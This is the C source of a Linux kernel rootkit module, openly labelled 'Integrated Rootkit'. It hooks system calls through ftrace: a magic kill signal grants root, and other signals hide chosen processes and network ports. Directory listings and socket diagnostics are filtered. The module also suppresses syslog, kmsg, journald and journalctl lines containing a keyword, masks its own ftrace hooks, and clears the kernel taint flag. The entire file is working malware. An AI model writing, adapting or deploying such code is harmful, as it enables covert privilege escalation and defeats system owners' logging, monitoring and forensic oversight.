#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/kprobes.h>
#include <linux/version.h>
#include <linux/seq_file.h>
#include <linux/limits.h>
#include <linux/dirent.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <linux/cred.h>
#include <linux/list.h>
#include <linux/kobject.h>
#include <linux/vmalloc.h>
#include <linux/inet_diag.h>
#include <linux/netlink.h>
#include <linux/sock_diag.h>
#include <linux/in.h>
#include <net/sock.h>
#include <net/af_unix.h>
#include <linux/un.h>
#include <linux/uio.h>
#include <linux/file.h>
#include <linux/kmod.h>
#include <linux/inet.h>
#include <net/ipv6.h>
#include <linux/fs.h>
#include <linux/spinlock.h>
#include <linux/ftrace.h>
#include <linux/linkage.h>
#include <linux/string.h>

#include "ftrace_helper.h"

MODULE_LICENSE("GPL");
MODULE_INFO(intree, "Y");
MODULE_AUTHOR("Collaborative Merge");
MODULE_DESCRIPTION("Integrated Rootkit: Fixed & Stabilized");

#define GET_ROOT 31337
#define MAX_HIDDEN_PORTS 32
#define TARGET_STRING "deception"

/* --- Configuration State --- */
static const char *hide_keywords[] = {
    "deception",
   // "pam_unix(sudo:session)",
    "__x64_sys_kill",
    "__x64_sys_getdents64",
    "__x64_sys_recvmsg",
    "__x64_sys_sendmsg",
    "__x64_sys_sendto",
    "tcp6_seq_show",
    "vfs_read",
    "kallsyms_lookup_name",
    "do_syslog",
    "devkmsg_read",
    "__x64_sys_write"
};

/* --- Data Structures --- */
struct my_monitoring_hook {
    const char *target_name;
    void *wrapper_ptr;
    void *original_ptr;
};

struct hidden_pid {
    char pid_str[NAME_MAX];
    struct list_head list;
};

#define MONITOR_ENTRY(_name, _wrap, _orig) { .target_name = _name, .wrapper_ptr = _wrap, .original_ptr = _orig }

/* --- Function Pointer & Type Definitions --- */
typedef int (*do_syslog_t)(int type, char __user *buf, int len, int from_file);
typedef ssize_t (*devkmsg_read_t)(struct file *file, char __user *buf, size_t count, loff_t *ppos);

static do_syslog_t orig_do_syslog;
static devkmsg_read_t orig_devkmsg_read;

static asmlinkage long (*orig_recvmsg)(const struct pt_regs *);
static asmlinkage long (*orig_sendmsg)(const struct pt_regs *);
static asmlinkage long (*orig_sendto)(const struct pt_regs *);
static asmlinkage long (*orig_getdents64)(const struct pt_regs *);
static asmlinkage long (*orig_kill)(const struct pt_regs *);
static asmlinkage long (*orig_tcp6_seq_show)(struct seq_file *, void *);
static asmlinkage long (*orig_vfs_read)(struct file *file, char __user *buf, size_t count, loff_t *pos);

/* --- Forward Declarations --- */
static void filter_buffer(char *kernel_buf, size_t *bytes_read);
static asmlinkage int fh_do_syslog(int type, char __user *buf, int len, int from_file);
static asmlinkage ssize_t fh_devkmsg_read(struct file *file, char __user *buf, size_t count, loff_t *ppos);

/* --- Trackers and State Keepers --- */
static struct list_head *prev_module;

static u16 hidden_ports[MAX_HIDDEN_PORTS] = {0};
static int hidden_ports_count = 0;
static DEFINE_SPINLOCK(ports_lock);

static LIST_HEAD(hidden_pids_list);
static DEFINE_SPINLOCK(pids_lock);

/* --- Core String Filter Engine --- */
static bool buf_has_hide_keyword(const char *kbuf, size_t len)
{
    size_t i;
    for (i = 0; i < ARRAY_SIZE(hide_keywords); i++) {
        const char *kw = hide_keywords[i];
        if (kw && kw[0] != '\0') {
            if (len >= strlen(kw) && strnstr(kbuf, kw, len) != NULL)
                return true;
        }
    }
    return false;
}

static void filter_buffer(char *kernel_buf, size_t *bytes_read)
{
    char *src = kernel_buf;
    char *dst = kernel_buf;
    char *next_line;
    size_t remaining_bytes = *bytes_read;
    size_t clean_count = 0;

    while (remaining_bytes > 0) {
        char *eol = memchr(src, '\n', remaining_bytes);
        size_t line_len;

        if (eol) {
            line_len = (eol - src) + 1;
            next_line = eol + 1;
        } else {
            line_len = remaining_bytes;
            next_line = src + remaining_bytes;
        }

        if (!buf_has_hide_keyword(src, line_len)) {
            if (dst != src) {
                memmove(dst, src, line_len);
            }
            dst += line_len;
            clean_count += line_len;
        }

        remaining_bytes -= line_len;
        src = next_line;
    }

    *bytes_read = clean_count;
}

/* --- Logging Hook Implementations --- */
static asmlinkage int fh_do_syslog(int type, char __user *buf, int len, int from_file)
{
    int result = orig_do_syslog(type, buf, len, from_file);
    char *kbuf;

    if (result > 0 && (type == 2 || type == 3 || type == 4) && buf != NULL) {
        kbuf = kmalloc(result + 1, GFP_KERNEL);
        if (!kbuf)
            return result;

        if (copy_from_user(kbuf, buf, result)) {
            kfree(kbuf);
            return result;
        }
        kbuf[result] = '\0';

        if (buf_has_hide_keyword(kbuf, result))
            memset(kbuf, ' ', result);

        if (copy_to_user(buf, kbuf, result)) {
            /* Handle write fault silently */
        }

        kfree(kbuf);
    }

    return result;
}

static asmlinkage ssize_t fh_devkmsg_read(struct file *file, char __user *buf, size_t count, loff_t *ppos)
{
    ssize_t result;
    char *kbuf;
    bool match_found;

    while (1) {
        result = orig_devkmsg_read(file, buf, count, ppos);

        if (result <= 0 || buf == NULL)
            return result;

        kbuf = kmalloc(result + 1, GFP_KERNEL);
        if (!kbuf)
            return result;

        if (copy_from_user(kbuf, buf, result)) {
            kfree(kbuf);
            return result;
        }
        kbuf[result] = '\0';

        match_found = buf_has_hide_keyword(kbuf, result);
        kfree(kbuf);

        if (match_found)
            continue;

        break;
    }

    return result;
}

static bool path_is_journal_sock(const char *path, size_t plen)
{
    if (strnstr(path, "/run/systemd/journal/", plen))
        return true;
    if (strnstr(path, "/dev/log", plen))
        return true;
    return false;
}



static bool is_fd_journald(int fd, const struct sockaddr __user *uaddr, int addrlen)
{
    struct file *file;
    struct socket *sock;
    struct sock *peer;
    struct unix_address *addr;
    struct sockaddr_storage kaddr;
    bool match = false;

    if (uaddr && addrlen > offsetof(struct sockaddr_un, sun_path) && addrlen <= sizeof(kaddr)) {
        if (copy_from_user(&kaddr, uaddr, addrlen) == 0) {
            struct sockaddr_un *sun = (struct sockaddr_un *)&kaddr;
            size_t plen = addrlen - offsetof(struct sockaddr_un, sun_path);
            if (sun->sun_family == AF_UNIX && path_is_journal_sock(sun->sun_path, plen))
                return true;
        }
    }

    file = fget(fd);
    if (!file)
        return false;

    sock = sock_from_file(file);
    if (sock && sock->sk && sock->sk->sk_family == AF_UNIX) {
        rcu_read_lock();
        peer = READ_ONCE(unix_sk(sock->sk)->peer);
        if (peer) {
            addr = READ_ONCE(unix_sk(peer)->addr);
            if (addr && addr->len > offsetof(struct sockaddr_un, sun_path)) {
                size_t plen = addr->len - offsetof(struct sockaddr_un, sun_path);
                if (path_is_journal_sock(addr->name->sun_path, plen))
                    match = true;
            }
        }
        rcu_read_unlock();
    }

    fput(file);
    return match;
}


static asmlinkage long (*orig_write)(const struct pt_regs *);

static asmlinkage long hook_write(const struct pt_regs *regs)
{
    int fd = (int)regs->di;
    const void __user *ubuf = (const void __user *)regs->si;
    size_t count = (size_t)regs->dx;
    char *kbuf;
    size_t copy_len;

    if (!ubuf || count == 0 || count > 65536)
        return orig_write(regs);

    /* Branch 1: Filter formatted lines printed by journalctl to stdout (fd 1) */
    if (fd == 1 && strcmp(current->comm, "journalctl") == 0) {
        kbuf = kmalloc(count + 1, GFP_KERNEL);
        if (kbuf) {
            if (copy_from_user(kbuf, ubuf, count) == 0) {
                size_t clean_len = count;
                kbuf[count] = '\0';
                filter_buffer(kbuf, &clean_len);

                if (clean_len == 0) {
                    kfree(kbuf);
                    return (long)count;
                }

                if (clean_len < count) {
                    if (copy_to_user((void __user *)ubuf, kbuf, clean_len) == 0) {
                        struct pt_regs mod_regs = *regs;
                        mod_regs.dx = clean_len;
                        kfree(kbuf);
                        orig_write(&mod_regs);
                        return (long)count;
                    }
                }
            }
            kfree(kbuf);
        }
        return orig_write(regs);
    }

      /* Branch 2: Fast-skip non-socket fds, filter new logs sent to journald sockets */
    {
        struct file *file = fget(fd);
        if (!file)
            return orig_write(regs);

        if (!S_ISSOCK(file_inode(file)->i_mode)) {
            fput(file);
            return orig_write(regs);
        }
        fput(file);
    }

    if (is_fd_journald(fd, NULL, 0)) {
        copy_len = min_t(size_t, count, 4095);
        kbuf = kmalloc(copy_len + 1, GFP_KERNEL);
        if (kbuf) {
            if (copy_from_user(kbuf, ubuf, copy_len) == 0) {
                kbuf[copy_len] = '\0';
                if (buf_has_hide_keyword(kbuf, copy_len)) {
                    kfree(kbuf);
                    return (long)count;
                }
            }
            kfree(kbuf);
        }
    }

    return orig_write(regs);
}




static asmlinkage long hook_sendmsg(const struct pt_regs *regs)
{
    int fd = (int)regs->di;
    struct user_msghdr __user *umsg = (struct user_msghdr __user *)regs->si;
    struct user_msghdr kmsg;
    struct iovec __user *uiov;
    size_t i, nr_segs, total_bytes = 0;
    char *kbuf;

    if (!umsg || copy_from_user(&kmsg, umsg, sizeof(kmsg)) != 0)
        return orig_sendmsg(regs);

    if (!is_fd_journald(fd, kmsg.msg_name, kmsg.msg_namelen))
        return orig_sendmsg(regs);

    uiov = (struct iovec __user *)kmsg.msg_iov;
    nr_segs = min_t(size_t, kmsg.msg_iovlen, 32);
    if (!uiov || nr_segs == 0)
        return orig_sendmsg(regs);

    kbuf = kmalloc(4096, GFP_KERNEL);
    if (!kbuf)
        return orig_sendmsg(regs);

    for (i = 0; i < nr_segs; i++) {
        struct iovec iov;
        size_t copy_len;

        if (copy_from_user(&iov, &uiov[i], sizeof(iov)) != 0)
            break;

        total_bytes += iov.iov_len;
        if (!iov.iov_base || iov.iov_len == 0)
            continue;

        copy_len = min_t(size_t, iov.iov_len, 4095);
        if (copy_from_user(kbuf, iov.iov_base, copy_len) == 0) {
            kbuf[copy_len] = '\0';
            if (buf_has_hide_keyword(kbuf, copy_len)) {
                for (i++; i < nr_segs; i++) {
                    if (copy_from_user(&iov, &uiov[i], sizeof(iov)) == 0)
                        total_bytes += iov.iov_len;
                }
                kfree(kbuf);
                return (long)total_bytes;
            }
        }
    }

    kfree(kbuf);
    return orig_sendmsg(regs);
}

static asmlinkage long hook_sendto(const struct pt_regs *regs)
{
    int fd = (int)regs->di;
    const void __user *ubuf = (const void __user *)regs->si;
    size_t len = (size_t)regs->dx;
    const struct sockaddr __user *uaddr = (const struct sockaddr __user *)regs->r8;
    int addrlen = (int)regs->r9;
    char *kbuf;
    size_t copy_len;

    if (ubuf && len > 0 && is_fd_journald(fd, uaddr, addrlen)) {
        copy_len = min_t(size_t, len, 4095);
        kbuf = kmalloc(copy_len + 1, GFP_KERNEL);
        if (kbuf) {
            if (copy_from_user(kbuf, ubuf, copy_len) == 0) {
                kbuf[copy_len] = '\0';
                if (buf_has_hide_keyword(kbuf, copy_len)) {
                    kfree(kbuf);
                    return (long)len;
                }
            }
            kfree(kbuf);
        }
    }

    return orig_sendto(regs);
}


/* --- Utility Functions --- */
static bool is_port_hidden(u16 port)
{
    int i;
    bool found = false;

    spin_lock(&ports_lock);
    for (i = 0; i < hidden_ports_count; i++) {
        if (hidden_ports[i] == port) {
            found = true;
            break;
        }
    }
    spin_unlock(&ports_lock);
    return found;
}

static void hideme_full(void)
{
    if (THIS_MODULE->list.prev && THIS_MODULE->list.next) {
        prev_module = THIS_MODULE->list.prev;
        list_del(&THIS_MODULE->list);
        kobject_del(&THIS_MODULE->mkobj.kobj);
    }
}

static bool is_pid_hidden(const char *name)
{
    struct hidden_pid *entry;
    bool found = false;

    spin_lock(&pids_lock);
    list_for_each_entry(entry, &hidden_pids_list, list) {
        if (strcmp(entry->pid_str, name) == 0) {
            found = true;
            break;
        }
    }
    spin_unlock(&pids_lock);
    return found;
}

static int remove_hidden_pid(const char *name)
{
    struct hidden_pid *entry, *tmp;
    int removed = 0;

    spin_lock(&pids_lock);
    list_for_each_entry_safe(entry, tmp, &hidden_pids_list, list) {
        if (strcmp(entry->pid_str, name) == 0) {
            list_del(&entry->list);
            kfree(entry);
            removed = 1;
            break;
        }
    }
    spin_unlock(&pids_lock);
    return removed;
}

static void clear_all_hidden_pids(void)
{
    struct hidden_pid *entry, *tmp;

    spin_lock(&pids_lock);
    list_for_each_entry_safe(entry, tmp, &hidden_pids_list, list) {
        list_del(&entry->list);
        kfree(entry);
    }
    spin_unlock(&pids_lock);
}

static void set_root(void)
{
    struct cred *root = prepare_creds();
    if (!root)
        return;

    root->uid.val  = 0;
    root->gid.val  = 0;
    root->euid.val = 0;
    root->egid.val = 0;

    commit_creds(root);
}

/* --- System Call Hook Implementations --- */
static asmlinkage long hook_recvmsg(const struct pt_regs *regs)
{
    struct msghdr __user *msg = (struct msghdr __user *)regs->si;
    struct user_msghdr umsg;
    struct iovec uiov;
    struct nlmsghdr *nlh;
    long ret = orig_recvmsg(regs);
    long offset = 0;
    void __user *iov_base;
    void *kbuf;

    if (ret <= 0 || hidden_ports_count == 0)
        return ret;

    if (copy_from_user(&umsg, msg, sizeof(umsg)) ||
        copy_from_user(&uiov, umsg.msg_iov, sizeof(uiov)))
        return ret;

    iov_base = uiov.iov_base;
    if (!iov_base)
        return ret;

    kbuf = kvzalloc(ret, GFP_KERNEL);
    if (!kbuf)
        return ret;

    if (copy_from_user(kbuf, iov_base, ret)) {
        kvfree(kbuf);
        return ret;
    }

    while (offset + NLMSG_HDRLEN <= ret) {
        long rem = ret - offset;
        nlh = (struct nlmsghdr *)(kbuf + offset);

        if (!NLMSG_OK(nlh, rem))
            break;

        if (nlh->nlmsg_type == NLMSG_DONE || nlh->nlmsg_type == NLMSG_ERROR) {
            offset += NLMSG_ALIGN(nlh->nlmsg_len);
            continue;
        }

        if (nlh->nlmsg_type == SOCK_DIAG_BY_FAMILY &&
            nlh->nlmsg_len >= NLMSG_LENGTH(sizeof(struct inet_diag_msg))) {
            struct inet_diag_msg *diag = (struct inet_diag_msg *)NLMSG_DATA(nlh);

            if (is_port_hidden(ntohs(diag->id.idiag_sport)) ||
                is_port_hidden(ntohs(diag->id.idiag_dport))) {
                size_t msg_len = NLMSG_ALIGN(nlh->nlmsg_len);
                memset(NLMSG_DATA(nlh), 0, msg_len - NLMSG_HDRLEN);
                nlh->nlmsg_type = NLMSG_NOOP;
            }
        }

        offset += NLMSG_ALIGN(nlh->nlmsg_len);
    }

    if (copy_to_user(iov_base, kbuf, ret)) {
        kvfree(kbuf);
        return -EFAULT;
    }

    kvfree(kbuf);
    return ret;
}

static asmlinkage int hook_getdents64(const struct pt_regs *regs)
{
    struct linux_dirent64 __user *dirent = (struct linux_dirent64 __user *)regs->si;
    struct linux_dirent64 *kdirent, *cur;
    int ret = orig_getdents64(regs);
    long bpos = 0;

    if (ret <= 0)
        return ret;

    kdirent = kvzalloc(ret, GFP_KERNEL);
    if (!kdirent)
        return ret;

    if (copy_from_user(kdirent, dirent, ret)) {
        kvfree(kdirent);
        return ret;
    }

    while (bpos < ret) {
        cur = (void *)kdirent + bpos;
        bool hide = false;

        if (cur->d_reclen == 0)
            break;

        if (is_pid_hidden(cur->d_name))
            hide = true;

        if (!hide && (cur->d_type == DT_DIR || cur->d_type == DT_UNKNOWN)) {
            if (strncmp(cur->d_name, "secret_", 7) == 0)
                hide = true;
        }

        if (hide) {
            long reclen = cur->d_reclen;
            long tail   = ret - (bpos + reclen);

            if (tail > 0) {
                memmove(cur, (void *)cur + reclen, tail);
            }
            ret -= reclen;
        } else {
            bpos += cur->d_reclen;
        }
    }

    if (copy_to_user(dirent, kdirent, ret)) {
        kvfree(kdirent);
        return -EFAULT;
    }

    kvfree(kdirent);
    return ret;
}

static asmlinkage long hook_kill(const struct pt_regs *regs)
{
    pid_t pid = (pid_t)regs_get_kernel_argument((struct pt_regs *)regs, 0);
    int   sig = (int)regs_get_kernel_argument((struct pt_regs *)regs, 1);
    struct hidden_pid *pid_entry;
    char pid_str[NAME_MAX];
    int i;

    if (sig == 64 && pid == GET_ROOT) {
        set_root();
        return 0;
    }

    if (sig == 62) {
        if (pid == 0) {
            clear_all_hidden_pids();
            return 0;
        }

        snprintf(pid_str, sizeof(pid_str), "%d", pid);

        if (remove_hidden_pid(pid_str))
            return 0;

        pid_entry = kmalloc(sizeof(*pid_entry), GFP_KERNEL);
        if (pid_entry) {
            strscpy(pid_entry->pid_str, pid_str, sizeof(pid_entry->pid_str));
            spin_lock(&pids_lock);
            list_add(&pid_entry->list, &hidden_pids_list);
            spin_unlock(&pids_lock);
        }
        return 0;
    }

    if (sig == 61) {
        u16 target_port = (u16)pid;

        spin_lock(&ports_lock);
        if (target_port == 0) {
            hidden_ports_count = 0;
            spin_unlock(&ports_lock);
            return 0;
        }

        for (i = 0; i < hidden_ports_count; i++) {
            if (hidden_ports[i] == target_port) {
                int j;
                for (j = i; j < hidden_ports_count - 1; j++)
                    hidden_ports[j] = hidden_ports[j + 1];

                hidden_ports_count--;
                spin_unlock(&ports_lock);
                return 0;
            }
        }

        if (hidden_ports_count < MAX_HIDDEN_PORTS)
            hidden_ports[hidden_ports_count++] = target_port;

        spin_unlock(&ports_lock);
        return 0;
    }

    return orig_kill(regs);
}

/* --- Network Seq Show Hooks (IPv6 only) --- */
static int hooked_tcp6_seq_show(struct seq_file *seq, void *v)
{
    int ret;

    if (!orig_tcp6_seq_show)
        return -EINVAL;

    ret = orig_tcp6_seq_show(seq, v);

    if (seq && seq->buf && seq->count > 0 && seq->count < seq->size) {
        size_t local_count = (size_t)seq->count;
        filter_buffer(seq->buf, &local_count);

        if (local_count <= (size_t)seq->size)
            seq->count = (int)local_count;
    }

    return ret;
}

static asmlinkage long hooked_vfs_read(struct file *file, char __user *buf, size_t count, loff_t *pos)
{
    long ret;
    char *kbuf;

    if (!orig_vfs_read)
        return -EINVAL;

    ret = orig_vfs_read(file, buf, count, pos);

    if (ret > 0 && ret < KMALLOC_MAX_SIZE && file && file->f_path.dentry) {
        const char *fname = file->f_path.dentry->d_name.name;

        if (strcmp(fname, "enabled_functions") == 0 || strcmp(fname, "touched_functions") == 0) {
            size_t alloc_size;

            if (check_add_overflow((size_t)ret, (size_t)1, &alloc_size)) {
                return ret;
            }

            kbuf = kmalloc(alloc_size, GFP_KERNEL);
            if (!kbuf)
                return ret;

            if (copy_from_user(kbuf, buf, ret)) {
                kfree(kbuf);
                return ret;
            }
            kbuf[ret] = '\0';

            size_t new_size = (size_t)ret;
            filter_buffer(kbuf, &new_size);

            if (new_size > (alloc_size - 1)) {
                new_size = alloc_size - 1;
            }

            if (copy_to_user(buf, kbuf, new_size)) {
                kfree(kbuf);
                return -EFAULT;
            }

            kfree(kbuf);
            return (long)new_size;
        }
    }

    return ret;
}

/* --- Hook Array Specification Matrix --- */
static struct ftrace_hook fh_hooks[] = {
    HOOK("__x64_sys_recvmsg",    hook_recvmsg,         &orig_recvmsg),
    HOOK("__x64_sys_sendmsg",    hook_sendmsg,         &orig_sendmsg),
    HOOK("__x64_sys_sendto",     hook_sendto,          &orig_sendto),
    HOOK("__x64_sys_getdents64", hook_getdents64,      &orig_getdents64),
    HOOK("__x64_sys_kill",       hook_kill,            &orig_kill),
    HOOK("tcp6_seq_show",        hooked_tcp6_seq_show, &orig_tcp6_seq_show),
    HOOK("do_syslog",            fh_do_syslog,         &orig_do_syslog),
    HOOK("devkmsg_read",         fh_devkmsg_read,      &orig_devkmsg_read),
    HOOK("__x64_sys_write",     hook_write,          &orig_write),
    {
        .name     = "vfs_read",
        .function = hooked_vfs_read,
        .original = &orig_vfs_read,
    },
};

/* --- Module Initialization --- */
static int __init deception_init(void)
{
    int err;
    unsigned long *tainted_mask_ptr;
    typedef unsigned long (*kallsyms_lookup_name_t)(const char *name);
    kallsyms_lookup_name_t kallsyms_lookup_name_fn;
    struct kprobe kp = { .symbol_name = "kallsyms_lookup_name" };

    if (register_kprobe(&kp) < 0)
        return -1;

    kallsyms_lookup_name_fn = (kallsyms_lookup_name_t)kp.addr;
    unregister_kprobe(&kp);

    if (!kallsyms_lookup_name_fn)
        return -EINVAL;

    tainted_mask_ptr = (unsigned long *)kallsyms_lookup_name_fn("tainted_mask");
    if (tainted_mask_ptr)
        *tainted_mask_ptr = 0;

    err = fh_install_hooks(fh_hooks, ARRAY_SIZE(fh_hooks));
    if (err)
        return err;

    return 0;
}

static void __exit deception_exit(void)
{
    fh_remove_hooks(fh_hooks, ARRAY_SIZE(fh_hooks));
    clear_all_hidden_pids();
}

module_init(deception_init);
module_exit(deception_exit);

